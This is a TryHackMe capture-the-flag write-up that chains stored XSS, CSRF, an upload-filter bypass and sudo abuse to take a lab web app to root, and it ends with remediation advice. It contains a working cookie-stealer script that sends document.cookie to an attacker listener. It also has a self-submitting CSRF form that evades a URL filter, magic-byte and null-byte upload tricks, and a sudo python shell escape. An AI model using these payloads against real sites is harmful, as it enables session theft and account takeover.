# Whats Your Name? — TryHackMe Writeup

> **Room:** [Whats Your Name?](https://tryhackme.com/room/whatsyourname) · **Difficulty:** Medium
> **Category:** Web / Client-side exploitation (XSS + CSRF)
> **Author of writeup:** 0xnyx
> **Goal:** Chain stored XSS and CSRF to climb from anonymous → moderator → admin, then root.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/whatsyourname), **no flags or passwords are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**. The theme is **client-side attacks**: we never crack a password — instead we make privileged *users* (a moderator, then the admin) run our code in their own browsers.

---

## Step 1 — Port scan + the key cookie detail

**Do**

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp   open  ssh    OpenSSH ...
80/tcp   open  http   Apache (served from /public/html/)
8081/tcp open  http   Apache (secondary)
| http-cookie-flags: PHPSESSID: httponly flag not set
```

**Why / what next** — The single most important line: **`PHPSESSID` has `HttpOnly` NOT set**. `HttpOnly` is what normally hides a cookie from JavaScript. Without it, any JavaScript we get to run in a victim's browser can read `document.cookie` and steal their session. That tells us the whole room is an **XSS → session theft** play.

**Do** — Add the vhosts to your hosts file (names come from redirects / the site).

```bash
echo "<TARGET> worldwap.thm login.worldwap.thm" | sudo tee -a /etc/hosts
```

---

## Step 2 — Find the registration API

**Do** — Open the register page and read its JavaScript (`register.js`) to learn the real API call.

```bash
curl -s http://login.worldwap.thm/js/register.js
```

**You get**

```js
fetch('../../api/register.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json',
             'X-THM-API-Key': '<api-key-hardcoded-in-js>' },
  body: JSON.stringify({ username, password, email, name })
});
```

**Why / what next** — Two findings: (1) the API key we need is **hardcoded in the JS** (so we can register programmatically), and (2) the room text says new registrations are **reviewed by a moderator**. A human reviewing our attacker-controlled input is a perfect **stored-XSS delivery channel** — whatever we put in a field runs in *their* browser when they review it.

---

## Step 3 — Flag 1: stored XSS → steal the moderator's session

**Do** — Register an account, but put a **cookie-stealer** in the `name` field (the field the moderator will see). Start a listener first (`php -S 0.0.0.0:<PORT>`), then register with:

```html
<script>fetch("http://<ATTACKER>:<PORT>/?c="+btoa(document.cookie))</script>
```

**You get** — When the moderator reviews your registration, their browser runs your script and sends their cookie to your listener (base64-encoded via `btoa`).

**Why / what next** — Because sessions here **rotate quickly**, the cleanest approach is a catcher that **immediately re-uses** the stolen cookie server-side to fetch the moderator's own profile before it expires. The **first flag** appears in the header of the moderator profile at `login.worldwap.thm/profile.php`. Now we're effectively the moderator — which unlocks moderator-only features. Next we use those to reach the admin.

---

## Step 4 — Flag 2: CSRF via chat → reset the admin's password

**Do** — As moderator, you can see a chat (`chat.php`) and a password-change page (`change_password.php`). Two facts: `change_password.php` takes a `new_password` POST and has **no CSRF token**, and the **admin reads the chat**. So plant a self-submitting form in a chat message that targets the admin. The chat has a URL filter, so split the scheme with string concatenation (`'ht'+'tp://'`):

```html
<script>
window.onload = function () {
  var f = document.createElement('form');
  f.method = 'POST';
  f.action = 'ht'+'tp://login.worldwap.thm/change_password.php';
  var i = document.createElement('input');
  i.type = 'hidden'; i.name = 'new_password'; i.value = '<chosen-pw>';
  f.appendChild(i); document.body.appendChild(f); f.submit();
};
</script>
```

**You get** — When the admin views the chat, their browser **silently submits the form** and changes the admin password to the value *you* chose — because there's no CSRF token to stop a cross-request.

**Why / what next** — Log in as `admin` with your chosen password. The **second flag** is in the admin profile header. We now fully control the web app. Last layer: the operating system.

---

## Step 5 — Bonus: RCE → root

**Do** — Moderators/admins can upload files (`upload.php`). A pure `.php` upload is blocked, so bypass both the content check and the extension check at once: prepend PNG **magic bytes** (`89 50 4E 47 0D 0A 1A 0A`) so the file *looks* like an image, and use a null-byte filename trick (`shell.phpD.png`, where `D` is turned into a null byte in Burp) so it *saves* as `.php`. Then request the uploaded file to get a `www-data` shell and escalate:

```bash
sudo -l                                               # check sudo rights
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'   # sudo abuse → root
```

**You get** — A `www-data` shell from the upload, then a root shell via the sudo misconfiguration.

**Why / what next** — Full root. Box complete.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap | `HttpOnly` off → XSS is viable |
| 2 | Read register.js | API key + "moderator reviews" channel |
| 3 | Stored XSS in `name` | Moderator session (flag 1) |
| 4 | CSRF in chat → change_password | Admin account (flag 2) |
| 5 | Upload bypass + sudo | root |

## Lessons

- `HttpOnly` not set + a bot/human that reviews user content = **stored XSS → session theft**.
- Auto-reuse a stolen cookie server-side when sessions rotate fast.
- No CSRF token on a state-changing POST = **CSRF**; combine with stored XSS to hit a privileged victim.
- URL/keyword filters fall to **string concatenation** (`'ht'+'tp'`).
- Upload filters: combine **magic-byte spoofing** + extension/null-byte tricks.

## Remediation

- Set `HttpOnly` + `Secure` on session cookies; add a strict CSP.
- Output-encode all user content; never render raw HTML from users.
- Add CSRF tokens (and re-auth) to password changes.
- Validate uploads by content, store them outside the web root, and never execute user uploads.

---

*Write-up for [TryHackMe — Whats Your Name?](https://tryhackme.com/room/whatsyourname).*
